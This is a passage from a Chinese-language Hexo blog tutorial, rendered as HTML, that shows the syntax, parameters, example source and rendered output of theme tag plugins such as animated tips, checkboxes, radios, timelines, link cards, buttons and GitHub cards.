endtip %&#125;</span><br><span class="line">&#123;% tip cogs %&#125;cogs&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip key %&#125;key&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bell %&#125;bell&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip fa-atom %&#125;自定义font awesome图标&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="tip "><p>default</p></div><div class="tip info"><p>info</p></div><div class="tip success"><p>success</p></div><div class="tip error"><p>error</p></div><div class="tip warning"><p>warning</p></div><div class="tip bolt"><p>bolt</p></div><div class="tip ban"><p>ban</p></div><div class="tip home"><p>home</p></div><div class="tip sync"><p>sync</p></div><div class="tip cogs"><p>cogs</p></div><div class="tip key"><p>key</p></div><div class="tip bell"><p>bell</p></div><div class="tip fa-atom"><p>自定义 font awesome 图标</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-6-动态标签-anima">2.6 动态标签 anima</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><div class="note info flat"><ol><li>将所需的 CSS 类添加到图标（或 DOM 中的任何元素）。</li><li>对于父级悬停样式，需要给目标元素添加指定 CSS 类，同时还要给目标元素的父级元素添加 CSS 类<code>faa-parent animated-hover</code>。（详情见示例及示例源码）<br>You can regulate the speed of the animation by adding the CSS class or . faa-fastfaa-slow</li><li>可以通过给目标元素添加 CSS 类<code>faa-fast</code>或<code>faa-slow</code>来控制动画快慢。</li></ol></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.On DOM load（当页面加载时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>2.调整动画速度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated faa-fast %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated faa-slow %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>3.On hover（当鼠标悬停时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated-hover %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated-hover %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>4.On parent hover（当鼠标悬停在父级元素时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-horizontal&quot;</span>&gt;</span></span>warning<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-flash&quot;</span>&gt;</span></span>ban<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.On DOM load（当页面加载时显示动画）</p><div class="tip warning faa-horizontal animated"><p>warning</p></div><div class="tip ban faa-flash animated"><p>ban</p></div> 2.调整动画速度<div class="tip warning faa-horizontal animated faa-fast"><p>warning</p></div><div class="tip ban faa-flash animated faa-slow"><p>ban</p></div>3.On hover（当鼠标悬停时显示动画）<div class="tip warning faa-horizontal animated-hover"><p>warning</p></div><div class="tip ban faa-flash animated-hover"><p>ban</p></div>4.On parent hover（当鼠标悬停在父级元素时显示动画）<div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">warning</p></div><div class="tip ban faa-parent animated-hover"><p class="faa-flash">ban</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-7-复选列表-checkbox">2.7 复选列表 checkbox</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: plus, minus, times</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>黄色 + 默认选中</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>青色 + 默认选中</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>蓝色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-8-单选列表-radio">2.8 单选列表 radio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 纯文本测试 %&#125;</span><br><span class="line">&#123;% radio checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% radio red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% radio green, 绿色 %&#125;</span><br><span class="line">&#123;% radio yellow, 黄色 %&#125;</span><br><span class="line">&#123;% radio cyan, 青色 %&#125;</span><br><span class="line">&#123;% radio blue, 蓝色 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="radio" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="radio" />            <p>支持自定义颜色</p>            </div><div class='checkbox green'><input type="radio" />            <p>绿色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><div class='checkbox cyan'><input type="radio" />            <p>青色</p>            </div><div class='checkbox blue'><input type="radio" />            <p>蓝色</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-9-时间轴-timeline">2.9 时间轴 timeline</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间线标题（可选）[,color] %&#125;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>title</code>:标题/时间线</li><li><code>color</code>:<code>timeline</code>颜色:default(留空) / blue / pink / red / purple / orange / green</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间轴样式,blue %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-07-24 [<span class="string">2.6.6 -&gt; 3.0</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 如果有 <span class="code">`hexo-lazyload-image`</span> 插件，需要删除并重新安装最新版本，设置 <span class="code">`lazyload.isSPA: true`</span>。</span><br><span class="line"><span class="bullet">2.</span> 2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <span class="code">`use_cdn: true`</span> 则需要删除。</span><br><span class="line"><span class="bullet">3.</span> 2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</span><br><span class="line"><span class="bullet">4.</span> 2.x 版本的置顶 <span class="code">`top: true`</span> 改为了 <span class="code">`pin: true`</span>，并且同样适用于 <span class="code">`layout: page`</span> 的页面。</span><br><span class="line"><span class="bullet">5.</span> 如果使用了 <span class="code">`hexo-offline`</span> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-05-15 [<span class="string">2.6.3 -&gt; 2.6.6</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6</span>) --&gt;</span><br><span class="line"></span><br><span class="line">不需要额外处理。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-04-20 [<span class="string">2.6.2 -&gt; 2.6.3</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 全局搜索 <span class="code">`seotitle`</span> 并替换为 <span class="code">`seo_title`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的索引规则有变，使用 group 组件的文章内，<span class="code">`group: group_name`</span> 对应的组件名必须是 <span class="code">`group_name`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的列表名优先显示文章的 <span class="code">`short_title`</span> 其次是 <span class="code">`title`</span>。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>时间轴样式</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-07-24 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases">2.6.6 -&gt; 3.0</a></p></div></div><div class='timeline-item-content'><ol><li>如果有 <code>hexo-lazyload-image</code> 插件，需要删除并重新安装最新版本，设置 <code>lazyload.isSPA: true</code>。</li><li>2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <code>use_cdn: true</code> 则需要删除。</li><li>2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</li><li>2.x 版本的置顶 <code>top: true</code> 改为了 <code>pin: true</code>，并且同样适用于 <code>layout: page</code> 的页面。</li><li>如果使用了 <code>hexo-offline</code> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-05-15 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6">2.6.3 -&gt; 2.6.6</a></p></div></div><div class='timeline-item-content'><p>不需要额外处理。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-04-20 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3">2.6.2 -&gt; 2.6.3</a></p></div></div><div class='timeline-item-content'><ol><li>全局搜索 <code>seotitle</code> 并替换为 <code>seo_title</code>。</li><li>group 组件的索引规则有变，使用 group 组件的文章内，<code>group: group_name</code> 对应的组件名必须是 <code>group_name</code>。</li><li>group 组件的列表名优先显示文章的 <code>short_title</code> 其次是 <code>title</code>。</li></ol></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-10-链接卡片-link">2.10 链接卡片 link</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 糖果屋教程贴, https://akilar.top/posts/615e2dec/, https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="tag link"><a class="link-card" title="糖果屋教程贴" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico"/></div><div class="right"><p class="text">糖果屋教程贴</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-11-按钮-btns">2.11 按钮 btns</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns 样式参数 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>圆角样式：rounded, circle</li><li>增加文字样式：可以在容器内增加 <code>&lt;b&gt;</code>标题<code>&lt;/b&gt;</code>和<code>&lt;p&gt;</code>描述文字<code>&lt;/p&gt;</code></li><li>布局方式：<br>默认为自动宽度，适合视野内只有一两个的情况。</li></ol><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>wide</td><td>宽一点的按钮</td></tr><tr><td>fill</td><td>填充布局，自动铺满至少一行，多了会换行</td></tr><tr><td>center</td><td>居中，按钮之间是固定间距</td></tr><tr><td>around</td><td>居中分散</td></tr><tr><td>grid2</td><td>等宽最多 2 列，屏幕变窄会适当减少列数</td></tr><tr><td>grid3</td><td>等宽最多 3 列，屏幕变窄会适当减少列数</td></tr><tr><td>grid4</td><td>等宽最多 4 列，屏幕变窄会适当减少列数</td></tr><tr><td>grid5</td><td>等宽最多 5 列，屏幕变窄会适当减少列数</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle grid5 %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>2.或者含有图标的按钮</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns rounded grid5 %&#125;</span><br><span class="line">&#123;% cell 下载源码, /, fas fa-download %&#125;</span><br><span class="line">&#123;% cell 查看文档, /, fas fa-book-open %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>3.圆形图标 + 标题 + 描述 + 图片 + 网格 5 列 + 居中</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle center grid5 %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">&#123;% p red, 专业版 %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">&#123;% p green, 免费版 %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><div class="btns circle grid5">            <a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a>          </div> 2.或者含有图标的按钮<div class="btns rounded grid5">            <a class="button" href='/' title='下载源码'><i class='fas fa-download'></i>下载源码</a><a class="button" href='/' title='查看文档'><i class='fas fa-book-open'></i>查看文档</a>          </div> 3.圆形图标 + 标题 + 描述 + 图片 + 网格 5 列 + 居中<div class="btns circle center grid5">            <a href='https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1'><i class='fab fa-apple'></i><b>心率管家</b><p class='p red'>专业版</p><img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png'></a><a href='https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1'><i class='fab fa-apple'></i><b>心率管家</b><p class='p green'>免费版</p><img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png'></a>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-12-github-卡片-ghcard">2.12 github 卡片 ghcard</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ghcard 用户名, 其它参数（可选） %&#125;</span><br><span class="line">&#123;% ghcard 用户名/仓库, 其它参数（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>使用<code>,</code>分割各个参数。写法为：<code>参数名=参数值</code><br>以下只写几个常用参数值。</p><table><thead><tr><th><strong>参数名</strong></th><th>取值</th><th>释义</th></tr></thead><tbody><tr><td>hide</td><td>stars,commits,prs,issues,contribs</td><td>隐藏指定统计</td></tr><tr><td>count_private</td><td>true</td><td>将私人项目贡献添加到总提交计数中</td></tr><tr><td>show_icons</td><td>true</td><td>显示图标</td></tr><tr><td>theme</td><td>查阅:<a href="https://github.com/anuraghazra/github-readme-stats/blob/master/themes/README.md">Available Themes</a></td><td>主题</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.用户信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span 